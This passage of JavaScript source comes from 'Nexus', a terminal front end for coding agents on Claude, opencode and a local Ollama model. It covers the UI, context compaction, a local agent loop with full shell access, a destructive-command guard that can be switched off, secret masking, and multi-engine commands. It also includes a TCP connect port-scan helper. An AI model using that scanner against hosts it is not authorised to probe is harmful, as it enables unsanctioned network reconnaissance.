    };
    // matching slash commands for the popup menu (active when the input is a bare /command being typed)
    const slashMatches = () => { if (busy || input[0] !== "/" || /\s/.test(input)) return []; const q = input.toLowerCase(); return allCmds().filter((c) => c[0].startsWith(q)); };
    const render = () => {
      const C = cols(), R = rows(), iw = Math.max(4, C - 3);
      const wrapped = []; for (const seg of input.split("\n")) { let s = seg; if (!s.length) { wrapped.push(""); continue; } while (s.length > iw) { wrapped.push(s.slice(0, iw)); s = s.slice(iw); } wrapped.push(s); } if (!wrapped.length) wrapped.push("");
      const menu = slashMatches();
      const menuRows = Math.min(menu.length, Math.max(0, R - 8));
      // clamp input rows so the whole chrome always fits even on short terminals
      const maxIn = Math.max(1, R - 5 - menuRows);
      const inRows = Math.max(1, Math.min(wrapped.length, 8, maxIn));
      const chrome = 1 /*status*/ + menuRows + 1 /*rule*/ + inRows + 1 /*rule*/ + 1 /*hint*/;
      const bodyRows = Math.max(1, R - chrome);
      const lines = bodyLines();
      const maxScroll = Math.max(0, lines.length - bodyRows);
      if (scroll > maxScroll) scroll = maxScroll;
      const start = Math.max(0, lines.length - bodyRows - scroll);
      const view = lines.slice(start, start + bodyRows);
      let b = ESC + "[H";
      for (let i = 0; i < bodyRows; i++) b += " " + clip(view[i] || "", C - 2) + ESC + "[K\r\n";
      b += statusBar() + ESC + "[K\r\n";
      for (let i = 0; i < menuRows; i++) { const [nm, ds] = menu[i]; const sel = i === 0; b += clip((sel ? cyan(" › ") : "   ") + (sel ? bold(cyan(nm)) : cyan(nm)) + gray("  " + ds), C - 2) + ESC + "[K\r\n"; }
      b += gray("─".repeat(C)) + ESC + "[K\r\n";
      const shown = wrapped.slice(Math.max(0, wrapped.length - inRows));
      for (let i = 0; i < inRows; i++) { const c = (i === inRows - 1 && !busy) ? "█" : ""; b += (i === 0 ? bold(mag("❯ ")) : "  ") + (shown[i] || "") + c + ESC + "[K\r\n"; }
      b += gray("─".repeat(C)) + ESC + "[K\r\n";
      b += hint() + ESC + "[K";
      b += ESC + "[J"; // clear anything below (e.g. when menu shrinks)
      out.write(b);
    };
    // ---- animation loop: typewriter reveal + spinners + elapsed ----
    const revealing = () => { const b = cur(); if (!b || !b.items) return false; return b.items.some((it) => it.type === "text" && it.shown < it.full.length); };
    const startTick = () => { if (tick) return; tick = setInterval(() => { const b = cur(); if (b && b.items) for (const it of b.items) if (it.type === "text" && it.shown < it.full.length) { let ns = Math.min(it.full.length, it.shown + Math.max(2, Math.ceil((it.full.length - it.shown) / 22))); const cc = it.full.charCodeAt(ns - 1); if (cc >= 0xD800 && cc <= 0xDBFF && ns < it.full.length) ns++; it.shown = ns; } render(); if (!busy && !revealing() && !compact.on) { clearInterval(tick); tick = null; } }, 45); };
    // ---- context compaction (visual + local prune) ----
    const doCompact = (auto) => {
      if (compact.on) return;
      compact.on = true; compact.f = 0; startTick();
      compact.iv = setInterval(() => {
        compact.f += 1;
        if (compact.f >= 22) {
          clearInterval(compact.iv); compact.iv = null;
          const keep = transcript.slice(-6);
          transcript.length = 0;
          transcript.push({ role: "system", text: "[earlier conversation compacted to save context" + (auto ? " — auto at " + Math.round((sess.ctxUsed / (sess.ctxWindow || 1)) * 100) + "%" : "") + "]" });
          for (const k of keep) transcript.push(k);
          // actually shrink the local engine's context: keep the system message + the last few exchanges, and drop the token estimate
          if (oMsgs.length > 7) { const sys = oMsgs[0]; const tail = oMsgs.slice(-6); oMsgs.length = 0; oMsgs.push(sys, ...tail); }
          sess.ctxUsed = Math.floor(sess.ctxUsed * 0.25); warned50 = false;
          compact.on = false; render();
        } else render();
      }, 60);
    };
    const maybeAutoCompact = () => { if (!PAID[engine] && sess.ctxUsed > 0.8 * (sess.ctxWindow || 200000) && !compact.on) doCompact(true); }; // claude self-compacts server-side; only auto-compact the local engine
    const onResize = () => { if (!loading) render(); };
    let cleaned = false;
    const cleanup = () => { if (cleaned) return; cleaned = true; tuiActive = false; if (tick) { clearInterval(tick); tick = null; } if (compact.iv) { clearInterval(compact.iv); compact.iv = null; } if (ctl && ctl.kill) try { ctl.kill(); } catch (_) {} for (const s of mcpServers) { try { s.cp && s.cp.kill(); } catch (_) {} } try { process.stdin.setRawMode(false); } catch (_) {} process.stdin.pause(); process.stdin.removeAllListeners("data"); out.removeListener("resize", onResize); process.removeListener("exit", cleanup); process.removeListener("SIGINT", onSigint); process.removeListener("SIGTERM", onSigterm); process.removeListener("uncaughtException", onFatal); process.removeListener("unhandledRejection", onRejection); out.write(ESC + "[?2004l" + ESC + "[?1000l" + ESC + "[?1006l" + ESC + "[?25h" + ESC + "[?1049l"); };
    tuiActive = true;
    const onFatal = (e) => { const sig = e === "SIGINT" || e === "SIGTERM"; try { cleanup(); } catch (_) {} if (e && e instanceof Error) { try { process.stderr.write("\nNexus exited on error: " + e.message + "\n"); } catch (_) {} } try { resolve(); } catch (_) {} if (sig) process.exit(0); };
    const onSigint = () => onFatal("SIGINT"), onSigterm = () => onFatal("SIGTERM");
    // a rejected turn promise must never leave the UI wedged with busy=true
    const onRejection = (e) => { if (busy || (ctl)) { busy = false; ctl = null; try { transcript.push({ role: "system", text: "recovered from an internal error: " + (e && e.message || e) }); } catch (_) {} try { render(); } catch (_) {} } };
    process.on("exit", cleanup); process.on("SIGINT", onSigint); process.on("SIGTERM", onSigterm); process.on("uncaughtException", onFatal); process.on("unhandledRejection", onRejection);
    // ---- engine turn ----
    const submit = (text) => {
      if (costCap && sess.cost >= costCap) { transcript.push({ role: "system", text: "budget reached ($" + sess.cost.toFixed(4) + " ≥ cap $" + costCap.toFixed(2) + ") — raise it with /budget <amount> to continue" }); render(); return; }
      if (hooks) { const hr = runHooks(hooks, "UserPromptSubmit", { NEXUS_ENGINE: engine, NEXUS_PROMPT: text }, cwd); if (hr.block) { transcript.push({ role: "user", text }); transcript.push({ role: "system", text: "blocked by UserPromptSubmit hook" + (hr.out ? ": " + hr.out : "") }); render(); return; } }
      history.push(text); hIdx = history.length; scroll = 0;
      transcript.push({ role: "user", text });
      let sendText = inlineAts(text);
      if (pinned.size) { let pre = ""; for (const f of pinned) { try { pre += "\n\n--- pinned: " + f + " ---\n" + fs.readFileSync(path.resolve(cwd, f), "utf8").slice(0, 8000) + "\n--- end " + f + " ---"; } catch (_) {} } if (pre) sendText = pre + "\n\n" + sendText; }
      if (index && engine === "ollama") { const rel = retrieve(text, 3); if (rel.length) { let pre = ""; for (const f of rel) { try { pre += "\n\n--- context: " + f + " ---\n" + fs.readFileSync(path.resolve(cwd, f), "utf8").slice(0, 6000) + "\n--- end " + f + " ---"; } catch (_) {} } if (pre) { sendText = pre + "\n\n" + sendText; transcript.push({ role: "system", text: "auto-context: pulled " + rel.join(", ") + " from the index" }); } } }
      if (redact && PAID[engine]) { const masked = maskSecrets(sendText); if (masked !== sendText) { const n = (masked.match(/\[redacted:/g) || []).length; transcript.push({ role: "system", text: "redacted " + n + " secret(s) before sending to " + engine + " (privacy mode on)" }); sendText = masked; } }
      const promptText = mode === 2 ? "Think step by step and produce a concise PLAN of what you would do. Do NOT modify any files yet.\n\n" + sendText : sendText;
      const block = { role: "nexus", items: [] }; transcript.push(block);
      const stat = { files: new Set(), paths: new Set(), cmds: 0, inTok0: sess.inTok, outTok0: sess.outTok, cost0: sess.cost, t0: Date.now() };
      const relOf = (p) => { try { return path.relative(cwd, path.resolve(cwd, p)); } catch (_) { return null; } };
      const ckTree = nexusCheckpoint(cwd); // every engine can now modify files, so always checkpoint (null if not a git repo)
      let ckObj = null; if (ckTree) { ckObj = { tree: ckTree, label: oneline(text, 40), ts: Date.now() }; checkpoints.push(ckObj); }
      busy = true; busyStart = Date.now(); busyWord = FORGE[Math.floor(Math.random() * FORGE.length)]; sess.liveOut = 0;
      ctl = makeCtl(); // local engine checks .stopped; claude overrides .kill with a process kill
      startTick(); render();
      const finish = (res) => {
        for (const it of block.items) if (it.type === "tool" && it.status === "run") { it.status = res && res.interrupted ? "err" : "ok"; it.end = Date.now(); }
        runningShells = 0; activeAgents = 0; ctl = null;
        if (!block.items.length || !block.items.some((i) => i.type === "text" && i.full.trim())) { const t = ensureText(); if (!t.full.trim()) t.full = res && res.interrupted ? "(interrupted)" : (res && res.output) || "(no output)"; }
        const dt = ((Date.now() - stat.t0) / 1000).toFixed(1);
        const din = sess.inTok - stat.inTok0, dout = sess.outTok - stat.outTok0, dcost = sess.cost - stat.cost0;
        if (PAID[engine]) { impact.cloudTurns++; impact.cloudInTok += Math.max(0, din); impact.cloudOutTok += Math.max(0, dout); impact.cloudCost += Math.max(0, dcost); } else { impact.localTurns++; impact.localTok += Math.max(0, din + dout); }
        const bits = [];
        if (stat.files.size) bits.push(stat.files.size + " file" + (stat.files.size > 1 ? "s" : ""));
        if (stat.cmds) bits.push(stat.cmds + " cmd" + (stat.cmds > 1 ? "s" : ""));
        bits.push("↑" + fmtK(din) + " ↓" + fmtK(dout) + " tok");
        if (PAID[engine] && dcost > 0) bits.push("$" + dcost.toFixed(4));
        bits.push(dt + "s");
        if (ckObj) { ckObj.paths = [...stat.paths].filter(Boolean); bits.push("undo #" + checkpoints.length); }
        block.summary = bits.join("  ·  ");
        cont = true; busy = false; if (costCap && sess.cost >= costCap) transcript.push({ role: "system", text: "budget cap reached ($" + sess.cost.toFixed(4) + ") — /budget <amount> to raise" });
        if (!warned50 && sess.ctxUsed > 0.5 * (sess.ctxWindow || 200000)) { warned50 = true; transcript.push({ role: "system", text: "context is over 50% — quality can dip on very long sessions; use /compact or /clear when it makes sense" }); }
        try { saveSession(); } catch (_) {}
        if (hooks) try { runHooks(hooks, "Stop", { NEXUS_ENGINE: engine }, cwd); } catch (_) {}
        if (notify && (Date.now() - stat.t0) > 15000) { out.write("\x07"); try { _cp.spawn("notify-send", ["Nexus", "turn finished (" + ((Date.now() - stat.t0) / 1000 | 0) + "s)"], { stdio: "ignore" }).on("error", () => {}); } catch (_) {} }
        maybeAutoCompact(); render();
      };
      if (engine === "claude") {
        runClaudeStream(promptText, cwd, cont, {
          onInit: (ev) => { if (ev.model) sess.model = ev.model; },
          onRateLimit: (info) => { rate = info; },
          onThinking: (t) => { const bl = cur(); if (!bl.items) bl.items = []; let last = bl.items[bl.items.length - 1]; if (!last || last.type !== "thinking") { last = { type: "thinking", full: "" }; bl.items.push(last); } last.full += t; render(); },
          onText: (t) => { ensureText().full += t; render(); },
          onTool: (tu) => {
            block.items.push({ type: "tool", id: tu.id, name: tu.name, label: toolLabel(tu.name, tu.input), detail: JSON.stringify(tu.input).slice(0, 400), status: "run", start: Date.now() });
            if (tu.name === "Bash") { runningShells++; stat.cmds++; }
            if (tu.name === "Task") activeAgents++;
            if (["Write", "Edit", "MultiEdit", "NotebookEdit"].includes(tu.name) && (tu.input.file_path || tu.input.notebook_path)) { const fp = tu.input.file_path || tu.input.notebook_path; stat.files.add(base(fp)); const r = relOf(fp); if (r) stat.paths.add(r); }
            render();
          },
          onToolResult: (tr) => {
            const it = block.items.find((x) => x.type === "tool" && x.id === tr.id);
            if (it) { it.status = tr.isError ? "err" : "ok"; it.end = Date.now(); it.detail = oneline(resultText(tr.content), 260); if (it.name === "Bash" && runningShells) runningShells--; if (it.name === "Task" && activeAgents) activeAgents--; }
            render();
          },
          onUsage: (u) => { sess.liveOut = u.output_tokens || sess.liveOut; },
          onResult: (ev) => {
            const u = ev.usage || {};
            sess.inTok += (u.input_tokens || 0) + (u.cache_read_input_tokens || 0) + (u.cache_creation_input_tokens || 0);
            sess.outTok += u.output_tokens || 0;
            sess.ctxUsed = (u.input_tokens || 0) + (u.cache_read_input_tokens || 0) + (u.cache_creation_input_tokens || 0) + (u.output_tokens || 0);
            if (typeof ev.total_cost_usd === "number") sess.cost += ev.total_cost_usd;
            const mu = ev.modelUsage && ev.modelUsage[sess.model]; if (mu && mu.contextWindow) sess.ctxWindow = mu.contextWindow;
          },
        }, ctl, cowork.on ? { model: cowork.strong, small: cowork.weak } : undefined).then(finish);
      } else if (engine === "opencode") {
        runEngineTask("opencode", promptText, cwd, true, cont, (chunk) => { ensureText().full += chunk; sess.liveOut += Math.ceil(chunk.length / 4); render(); }, ctl)
          .then((res) => { sess.inTok += Math.ceil(promptText.length / 4); sess.outTok += Math.ceil((res.output || "").length / 4); sess.ctxUsed = sess.inTok + sess.outTok; finish(res); });
      } else { // ollama — LOCAL agent with full device access (read/write/edit/list/run_command)
        const mcps = mcpToolList();
        const extra = (mcps.length ? " MCP tools: " + mcps.map((m) => m.full + " — " + oneline(m.desc, 40)).join("; ") + "." : "") + " spawn_agents{tasks:[\"...\",\"...\"]} runs several INDEPENDENT sub-tasks in parallel via sub-agents and returns all their results — use it to split big work.";
        if (oMsgs.length === 1) oMsgs[0].content = "You are Nexus, a local autonomous coding agent on the operator's own machine (cwd " + cwd + "). Accomplish the TASK by taking ONE action per step and reading each OBSERVATION before the next. TOOLS: read_file{path}, write_file{path,content}, edit_file{path,find,replace}, list_dir{path?}, run_command{command} (full shell), search{pattern,path?} (grep file contents), find{glob,path?} (find files), http_fetch{url,method?} (network), sysinfo{} (OS/CPU/memory/disk), list_processes{filter?}, make_dir{path}, move{from,to}, copy{from,to}, delete{path}." + extra + " Reply with exactly ONE JSON object: {\"thought\",\"action\":\"tool\",\"tool\",\"args\"} or {\"thought\",\"action\":\"final\",\"final\"}. Keep going until the task is fully done." + (nexusMd ? "\n\nPROJECT (.nexus/NEXUS.md):\n" + nexusMd.slice(0, 4000) : "");
        oMsgs.push({ role: "user", content: promptText });
        sess.inTok += Math.ceil(promptText.length / 4);
        const olbl = (n, a) => n === "read_file" ? "Read(" + base(a.path) + ")" : n === "write_file" ? "Write(" + base(a.path) + ")" : n === "edit_file" ? "Update(" + base(a.path) + ")" : n === "run_command" ? "Bash(" + oneline(a.command, 40) + ")" : n === "list_dir" ? "List(" + (a.path || ".") + ")" : (n === "search" || n === "grep") ? "Search(" + oneline(a.pattern || a.query, 30) + ")" : (n === "find" || n === "find_files" || n === "glob") ? "Find(" + oneline(a.glob || a.pattern || a.name, 30) + ")" : (n === "http_fetch" || n === "web_fetch" || n === "fetch_url" || n === "http") ? "Fetch(" + oneline(a.url, 36) + ")" : (n === "sysinfo" || n === "system_info") ? "Sysinfo()" : (n === "list_processes" || n === "ps") ? "Processes()" : (n === "make_dir" || n === "mkdir") ? "Mkdir(" + base(a.path) + ")" : (n === "move" || n === "rename" || n === "move_file") ? "Move(" + base(a.to || a.dest) + ")" : (n === "copy" || n === "copy_file") ? "Copy(" + base(a.to || a.dest) + ")" : (n === "delete" || n === "delete_file" || n === "rm") ? "Delete(" + base(a.path) + ")" : n === "spawn_agents" ? "Task(" + ((a.tasks || []).length) + " agents)" : String(n).startsWith("mcp__") ? String(n).replace(/^mcp__/, "").replace("__", ":") + "()" : n + "()";
        (async () => {
          let mdl = process.env.SENTINEL_MODEL || (sess.model && sess.model !== engine ? sess.model : "");
          if (!mdl) { mdl = pickCoderModel(await ollamaTags()); }
          sess.model = mdl || engine;
          if (!mdl) { ensureText().full = "No local model found. Install Ollama and pull one, e.g. `ollama pull hermes3`, or use /engine claude."; return finish({ output: "" }); }
          let didTool = false, nudges = 0;
          for (let step = 1; step <= 30; step++) {
            if (ctl && ctl.stopped) { ensureText().full += (ensureText().full.trim() ? "\n" : "") + "(interrupted)"; break; }
            let raw; try { raw = await ollamaChat(mdl, oMsgs, CODER_SCHEMA, aSignal(ctl)); } catch (e) { if (ctl && ctl.stopped) break; ensureText().full += "\nmodel error: " + e.message; break; }
            sess.outTok += Math.ceil(raw.length / 4); sess.liveOut += Math.ceil(raw.length / 4);
            let o; try { o = JSON.parse(raw); } catch (_) { oMsgs.push({ role: "tool", content: "Reply with valid schema JSON only." }); continue; }
            oMsgs.push({ role: "assistant", content: raw });
            if (o.thought) { const t = ensureText(); t.full += (t.full ? "\n" : "") + o.thought; render(); }
            if (o.action === "final") { if (!didTool && nudges++ < 2) { oMsgs.push({ role: "tool", content: "Do the real work with tools first." }); continue; } if (o.final) { const t = ensureText(); t.full += (t.full ? "\n\n" : "") + o.final; } break; }
            const name = o.tool, a = o.args || {};
            const card = { type: "tool", id: "o" + step, name, label: olbl(name, a), status: "run", start: Date.now(), detail: JSON.stringify(a).slice(0, 400) };
            block.items.push(card);
            if (name === "run_command") { runningShells++; stat.cmds++; }
            if (name === "spawn_agents") activeAgents += (a.tasks || []).length;
            if (["write_file", "edit_file"].includes(name) && a.path) { stat.files.add(base(a.path)); const r = relOf(a.path); if (r) stat.paths.add(r); }
            render();
            let result, blocked = false;
            if (mode === 2 && (["write_file", "edit_file", "run_command", "delete", "delete_file", "rm", "move", "move_file", "rename", "copy", "copy_file", "make_dir", "mkdir", "spawn_agents"].includes(name) || String(name).startsWith("mcp__"))) { result = { error: "plan mode is on — file/system changes are blocked. Describe the plan instead, then switch mode with shift+tab to execute." }; blocked = true; card.status = "err"; }
            if (!blocked && name === "run_command" && guard !== "off") { const d = classifyDanger(a.command); if (d.level === "block" && guard === "enforce") { result = { error: "BLOCKED by Sentinel guard: " + d.why + " (/guard off to allow, or run it yourself with !)" }; blocked = true; card.status = "err"; transcript.push({ role: "system", text: "Sentinel guard blocked a destructive command — " + d.why + ": " + oneline(a.command, 46) }); } else if (d.level !== "ok") transcript.push({ role: "system", text: "Sentinel: " + d.why + " — " + oneline(a.command, 46) + (d.level === "block" ? " (allowed; guard is " + guard + ")" : "") }); }
            if (!blocked && hooks) { const hr = runHooks(hooks, "PreToolUse", { TOOL_NAME: name, TOOL_ARGS: JSON.stringify(a) }, cwd); if (hr.block) { result = { error: "blocked by PreToolUse hook" + (hr.out ? ": " + hr.out : "") }; blocked = true; } }
            if (!blocked) try {
              if (name === "read_file") result = { content: fs.readFileSync(path.resolve(cwd, a.path), "utf8").slice(0, 14000) };
              else if (name === "list_dir") result = { items: fs.readdirSync(path.resolve(cwd, a.path || "."), { withFileTypes: true }).map((e) => e.isDirectory() ? e.name + "/" : e.name).slice(0, 200) };
              else if (name === "write_file") { const fp = path.resolve(cwd, a.path); fs.mkdirSync(path.dirname(fp), { recursive: true }); fs.writeFileSync(fp, a.content == null ? "" : a.content); const sec = scanSecrets(a.content); result = sec.length ? { ok: true, warning: "Nexus flagged possible secret(s) in this file: " + sec.join(", ") + " — review before committing" } : { ok: true }; if (sec.length) transcript.push({ role: "system", text: "security warning: " + a.path + " may contain " + sec.join(", ") + " — Nexus wrote it but flagged it" }); }
              else if (name === "edit_file") { const fp = path.resolve(cwd, a.path); const t = fs.readFileSync(fp, "utf8"); if (!t.includes(a.find)) result = { error: "find string not present" }; else { fs.writeFileSync(fp, t.replace(a.find, a.replace == null ? "" : a.replace)); result = { ok: true }; } }
              else if (name === "run_command") { const r = await coderShell(a.command, cwd); result = { code: r.code, output: (r.output || "").slice(0, 4000) }; }
              else if (name === "spawn_agents") { const tasks = (a.tasks || []).map(String).filter(Boolean).slice(0, 8); const outs = await runSubagents(engine, tasks, cwd, mdl, null, ctl); result = { agents: outs.map((o2, i) => ({ task: tasks[i], result: (o2 || "").slice(0, 1500) })) }; }
              else if (String(name).startsWith("mcp__")) { const srv = mcpServers.find((s) => !s.error && String(name).slice(5).startsWith(s.name + "__")); if (!srv) result = { error: "MCP tool not connected: " + name }; else { const tool = String(name).slice(5 + srv.name.length + 2); const r = await srv.call("tools/call", { name: tool, arguments: a }); result = { content: resultText((r && r.content) || r) }; } }
              else { const dr = await deviceTool(name, a, cwd); result = dr !== null ? dr : { error: "unknown tool " + name }; if (dr !== null && ["move", "copy", "copy_file", "move_file", "rename", "make_dir", "mkdir", "delete", "delete_file", "rm"].includes(name) && (a.path || a.to || a.dest)) { const fp = a.to || a.dest || a.path; stat.files.add(base(fp)); const r = relOf(fp); if (r) stat.paths.add(r); } }
            } catch (e) { result = { error: e.message }; }
            if (!(result && typeof result.error === "string" && result.error.startsWith("unknown tool"))) didTool = true;
            if (name === "run_command" && runningShells) runningShells--;
            if (name === "spawn_agents") activeAgents = Math.max(0, activeAgents - (a.tasks || []).length);
            if (hooks && !blocked) try { runHooks(hooks, "PostToolUse", { TOOL_NAME: name, TOOL_ARGS: JSON.stringify(a), TOOL_RESULT: JSON.stringify(result).slice(0, 2000) }, cwd); } catch (_) {}
            card.status = result.error ? "err" : "ok"; card.end = Date.now(); card.detail = oneline(resultText(JSON.stringify(result)), 260);
            const obs = JSON.stringify(result).slice(0, 14000);
            oMsgs.push({ role: "tool", content: obs }); sess.inTok += Math.ceil(obs.length / 4);
            render();
          }
          sess.ctxUsed = sess.inTok + sess.outTok;
          finish({ output: "done" });
        })();
      }
    };
    // ---- parallel sub-agents: fan a set of independent tasks across the current engine ----
    const spawnAgents = (tasks) => {
      tasks = tasks.map((s) => s.trim()).filter(Boolean).slice(0, 8);
      transcript.push({ role: "user", text: "/agents  " + tasks.join("  ;;  ") });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      const t0 = Date.now(), in0 = sess.inTok, out0 = sess.outTok; scroll = 0;
      busy = true; busyStart = Date.now(); busyWord = "Orchestrating"; sess.liveOut = 0;
      ctl = makeCtl();
      activeAgents = tasks.length;
      const cards = tasks.map((tk, i) => ({ type: "tool", id: "ag" + i, name: "Task", label: "Task(" + oneline(tk, 30) + ")", status: "run", start: Date.now(), detail: tk }));
      cards.forEach((c) => block.items.push(c));
      startTick(); render();
      const agentsCtl = ctl; const pick = (cowork.on && engine === "claude") ? ((t) => { const est = Math.ceil(t.length / 4) + 800; if (isMechanical(t) && shouldDelegate(est, est * 4, cowork.strong, cowork.weak)) { impact.delegated++; impact.coworkSaved += (priceOf(cowork.strong).out - priceOf(cowork.weak).out) * (est * 3) / 1e6; return cowork.weak; } return cowork.strong; }) : null; (async () => { const mdl = engine === "ollama" ? (sess.model && sess.model !== engine ? sess.model : pickCoderModel(await ollamaTags())) : sess.model; return runSubagents(engine, tasks, cwd, mdl, (i, phase) => { if (phase === "done") { cards[i].status = "ok"; cards[i].end = Date.now(); activeAgents = Math.max(0, activeAgents - 1); } render(); }, agentsCtl, pick); })()
        .then((outs) => {
          const t = ensureText();
          t.full = outs.map((o, i) => "### agent " + (i + 1) + " — " + oneline(tasks[i], 60) + "\n" + (o || "(no output)")).join("\n\n");
          for (const c of cards) if (c.status === "run") { c.status = "ok"; c.end = Date.now(); }
          sess.outTok += Math.ceil(outs.join("").length / 4); sess.ctxUsed = sess.inTok + sess.outTok;
          activeAgents = 0; busy = false; ctl = null;
          block.summary = tasks.length + " agents  ·  ↑" + fmtK(sess.inTok - in0) + " ↓" + fmtK(sess.outTok - out0) + " tok  ·  " + ((Date.now() - t0) / 1000).toFixed(1) + "s";
          try { saveSession(); } catch (_) {} render();
        });
    };
    // quick TCP connect scan (Nexus ships with the Sentinel security toolkit)
    const quickScan = (host, ports) => new Promise((resolve) => {
      const net = require("net"); const open = []; let done = 0;
      if (!ports.length) return resolve([]);
      ports.forEach((port) => { const sk = new net.Socket(); sk.setTimeout(1200); sk.once("connect", () => { open.push(port); sk.destroy(); }).once("timeout", () => sk.destroy()).once("error", () => {}).once("close", () => { if (++done === ports.length) resolve(open.sort((x, y) => x - y)); }); try { sk.connect(port, host); } catch (_) { if (++done === ports.length) resolve(open); } });
    });
    // /race — run the SAME prompt on multiple engines at once and show every answer (cloud vs local)
    const raceEngines = (prompt) => {
      const avail = []; if (hasBin("claude")) avail.push("claude"); avail.push("ollama"); // opencode only when it's the current engine (it often needs setup)
      const race = [...new Set([engine].concat(avail))].slice(0, 3);
      transcript.push({ role: "user", text: "/race  " + prompt });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      const t0 = Date.now(); scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Racing"; ctl = makeCtl();
      const cards = race.map((e, i) => ({ type: "tool", id: "rc" + i, name: "Task", label: "Task(" + e + ")", status: "run", start: Date.now(), detail: e }));
      cards.forEach((c) => block.items.push(c)); startTick(); render();
      const racer = (e, i) => {
        const s = Date.now();
        const work = (async () => { let out; try { if (e === "ollama") { const mdl = sess.model && sess.model !== engine ? sess.model : pickCoderModel(await ollamaTags()); out = await ollamaChat(mdl, [{ role: "user", content: prompt }], undefined, aSignal(ctl)); } else { out = (await runEngineTask(e, prompt, cwd, false, false, null, ctl)).output; } } catch (err) { out = "error: " + err.message; } return { e, out: (out || "").trim(), ms: Date.now() - s }; })(); // read-only (autonomous=false) — /race compares answers, shouldn't edit files
        const timeout = new Promise((res) => setTimeout(() => res({ e, out: "(no response within 60s)", ms: 60000, timedOut: true }), 60000));
        return Promise.race([work, timeout]).then((r) => { cards[i].status = r.timedOut ? "err" : "ok"; cards[i].end = Date.now(); render(); return r; });
      };
      Promise.all(race.map(racer)).then((res) => {
        res.sort((a, b) => a.ms - b.ms);
        ensureText().full = res.map((r, i) => "### " + (i === 0 ? "fastest — " : "") + r.e + "  (" + (r.ms / 1000).toFixed(1) + "s)\n" + (r.out || "(no output)")).join("\n\n");
        busy = false; ctl = null; block.summary = race.length + " engines raced  ·  " + ((Date.now() - t0) / 1000).toFixed(1) + "s"; try { saveSession(); } catch (_) {} render();
      });
    };
    // /review — have a DIFFERENT engine critique Nexus's last answer (cross-engine second opinion)
    const reviewLast = (revEngine) => {
      let last = ""; for (let i = transcript.length - 1; i >= 0; i--) { const m = transcript[i]; if (m.role === "nexus") { last = (m.items || []).filter((it) => it.type === "text").map((it) => it.full).join("\n").trim(); if (last) break; } }
      if (!last) { transcript.push({ role: "system", text: "nothing to review yet — ask Nexus something first" }); render(); return; }
      const re = (["claude", "ollama", "opencode"].includes(revEngine) ? revEngine : (engine === "claude" ? "ollama" : "claude"));
      const prompt = "You are a rigorous senior reviewer. Critique the ANSWER below for correctness, bugs, security issues and anything missing. Be concise and specific; list concrete problems.\n\n--- ANSWER ---\n" + last.slice(0, 6000) + "\n--- END ANSWER ---";
      transcript.push({ role: "user", text: "/review  (second opinion from " + re + ")" });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Reviewing"; ctl = makeCtl();
      const card = { type: "tool", id: "rv", name: "Task", label: "Task(review via " + re + ")", status: "run", start: Date.now() };
      block.items.push(card); startTick(); render();
      (async () => {
        let out; try { if (re === "ollama") { const mdl = pickCoderModel(await ollamaTags()); out = await ollamaChat(mdl, [{ role: "user", content: prompt }], undefined, aSignal(ctl)); } else { out = (await runEngineTask(re, prompt, cwd, false, false, null, ctl)).output; } } catch (e) { out = "error: " + e.message; }
        card.status = "ok"; card.end = Date.now(); ensureText().full = "second opinion (" + re + "):\n\n" + (out || "(no output)").trim(); busy = false; ctl = null; try { saveSession(); } catch (_) {} render();
      })();
    };
    // ask one engine a question (no file changes) — used by /ensemble
    const engineAnswer = async (e, prompt) => { try { if (e === "ollama") { const mdl = sess.model && sess.model !== engine ? sess.model : pickCoderModel(await ollamaTags()); return await ollamaChat(mdl, [{ role: "user", content: prompt }], undefined, aSignal(ctl)); } return (await runEngineTask(e, prompt, cwd, false, false, null, ctl, (cowork.on && e === "claude") ? cowork.weak : undefined)).output; } catch (err) { return "error: " + err.message; } };
    // /ensemble — run the prompt on every engine, then synthesize the single best answer
    const ensembleEngines = (prompt) => {
      const avail = []; if (hasBin("claude") && !offline) avail.push("claude"); avail.push("ollama");
      const members = [...new Set([offline ? "ollama" : engine].concat(avail))].slice(0, 3);
      transcript.push({ role: "user", text: "/ensemble  " + prompt });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      const t0 = Date.now(); scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Ensembling"; ctl = makeCtl();
      const cards = members.map((e, i) => ({ type: "tool", id: "en" + i, name: "Task", label: "Task(" + e + ")", status: "run", start: Date.now(), detail: e }));
      const synth = { type: "tool", id: "syn", name: "Task", label: "Task(synthesize)", status: "run", start: Date.now() };
      cards.forEach((c) => block.items.push(c)); startTick(); render();
      Promise.all(members.map((e, i) => Promise.race([engineAnswer(e, prompt).then((o) => ({ e, o: (o || "").trim() })), new Promise((r) => setTimeout(() => r({ e, o: "(no response within 60s)" }), 60000))]).then((r) => { cards[i].status = "ok"; cards[i].end = Date.now(); render(); return r; })))
        .then(async (res) => {
          synth.start = Date.now(); block.items.push(synth); render();
          const se = offline ? "ollama" : engine;
          const sp = "You are given " + res.length + " candidate answers to the same question from different AI models. Produce the SINGLE best answer, combining their strengths and fixing any mistakes. Be direct.\n\nQUESTION:\n" + prompt + "\n\n" + res.map((r, i) => "=== candidate " + (i + 1) + " (" + r.e + ") ===\n" + r.o).join("\n\n") + "\n\nReturn ONLY the final best answer.";
          let best; try { best = await engineAnswer(se, sp); } catch (_) { best = res[0] && res[0].o; }
          synth.status = "ok"; synth.end = Date.now();
          ensureText().full = "best-of-" + res.length + " (synthesized by " + se + "):\n\n" + (best || "(no output)").trim();
          busy = false; ctl = null; block.summary = res.length + " engines + synthesis  ·  " + ((Date.now() - t0) / 1000).toFixed(1) + "s"; try { saveSession(); } catch (_) {} render();
        });
    };
    // /bench — run a prompt on each engine and report a speed / tokens / cost table (real cost for claude)
    const benchEngines = (prompt) => {
      const members = [...new Set([offline ? "ollama" : engine].concat((hasBin("claude") && !offline) ? ["claude", "ollama"] : ["ollama"]))].slice(0, 3);
      transcript.push({ role: "user", text: "/bench  " + prompt });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      const t0 = Date.now(); scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Benchmarking"; ctl = makeCtl();
      const cards = members.map((e, i) => ({ type: "tool", id: "bn" + i, name: "Task", label: "Task(" + e + ")", status: "run", start: Date.now(), detail: e }));
      cards.forEach((c) => block.items.push(c)); startTick(); render();
      const benchOne = (e) => new Promise((resolve) => { const s = Date.now(); (async () => {
